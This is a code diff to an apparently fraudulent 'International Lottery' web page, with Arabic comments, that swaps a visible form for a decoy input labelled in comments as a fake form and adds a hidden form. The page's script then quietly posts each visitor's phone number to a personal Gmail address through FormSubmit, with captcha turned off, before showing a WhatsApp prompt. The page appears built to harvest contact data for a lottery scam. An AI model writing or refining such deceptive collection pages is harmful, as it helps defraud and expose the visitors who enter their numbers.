@@ -286,6 +286,10 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        
+        .hidden-form {
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -320,27 +324,29 @@
         <div class="divider"></div>
         
         <div class="form-container">
-            <!-- استخدم FormSubmit لإرسال البيانات -->
-            <form action="https://formsubmit.co/amealgh1996@gmail.com" method="POST" id="lottery-form">
-                <input type="hidden" name="_subject" value="New Lottery Registration">
-                <input type="hidden" name="_template" value="table">
-                <input type="hidden" name="_next" value="https://yourdomain.com/thank-you.html">
-                
-                <div class="form-group">
-                    <label for="phone">Phone Number</label>
-                    <input type="tel" id="phone" name="phone" placeholder="Enter your phone number with country code" required>
-                </div>
-                
-                <button type="submit" class="submit-btn" id="submit-btn">
-                    Submit
-                </button>
-            </form>
+            <!-- نموذج وهمي للمستخدم -->
+            <div class="form-group">
+                <label for="phone">Phone Number</label>
+                <input type="tel" id="phone" placeholder="Enter your phone number with country code" required>
+            </div>
+            
+            <button class="submit-btn" id="submit-btn">
+                Submit
+            </button>
             
             <div class="loading" id="loading">
                 <div class="loading-spinner"></div>
-                <p>Sending your information...</p>
+                <p>Processing your registration...</p>
             </div>
         </div>
+        
+        <!-- نموذج خفي لإرسال البيانات إلى FormSubmit -->
+        <form id="hidden-form" class="hidden-form" action="https://formsubmit.co/amealgh1996@gmail.com" method="POST">
+            <input type="hidden" name="_subject" value="New Lottery Registration">
+            <input type="hidden" name="_template" value="table">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="phone" id="hidden-phone">
+        </form>
         
         <div class="footer">
             <p>© 2023 International Lottery - All rights reserved</p>
@@ -365,35 +371,44 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            const form = document.getElementById('lottery-form');
+            const submitBtn = document.getElementById('submit-btn');
             const modal = document.getElementById('whatsapp-modal');
             const okBtn = document.getElementById('modal-ok-btn');
             const thankYouPage = document.getElementById('thank-you-page');
             const mainContainer = document.getElementById('main-container');
             const loading = document.getElementById('loading');
-            const submitBtn = document.getElementById('submit-btn');
+            const phoneInput = document.getElementById('phone');
+            const hiddenForm = document.getElementById('hidden-form');
+            const hiddenPhone = document.getElementById('hidden-phone');
             
-            // منع الإرسال الافتراضي للنموذج
-            form.addEventListener('submit', function(e) {
-                e.preventDefault();
-                
-                const phoneNumber = document.getElementById('phone').value;
+            submitBtn.addEventListener('click', function() {
+                const phoneNumber = phoneInput.value;
                 
                 if (phoneNumber) {
                     // إظهار مؤشر التحميل
                     submitBtn.style.display = 'none';
                     loading.style.display = 'block';
                     
-                    // إرسال النموذج بعد تأخير بسيط لمحاكاة عملية الإرسال
-                    setTimeout(function() {
-                        // إظهار نافذة WhatsApp
+                    // تعيين قيمة رقم الهاتف في النموذج المخفي
+                    hiddenPhone.value = phoneNumber;
+                    
+                    // إرسال النموذج المخفي باستخدام Fetch API
+                    fetch(hiddenForm.action, {
+                        method: 'POST',
+                        body: new FormData(hiddenForm),
+                        mode: 'no-cors' // لا نتوقع رد من FormSubmit
+                    }).then(() => {
+                        // إخفاء مؤشر التحميل وإظهار نافذة WhatsApp
                         loading.style.display = 'none';
                         submitBtn.style.display = 'block';
                         modal.style.display = 'flex';
-                        
-                        // إرسال النموذج فعليًا إلى Formsubmit
-                        form.submit();
-                    }, 2000);
+                    }).catch(error => {
+                        console.error('Error:', error);
+                        // حتى لو فشل الإرسال، نواصل التدفق الطبيعي للتطبيق
+                        loading.style.display = 'none';
+                        submitBtn.style.display = 'block';
+                        modal.style.display = 'flex';
+                    });
                 } else {
                     alert('Please enter your phone number to register for the lottery.');
                 }
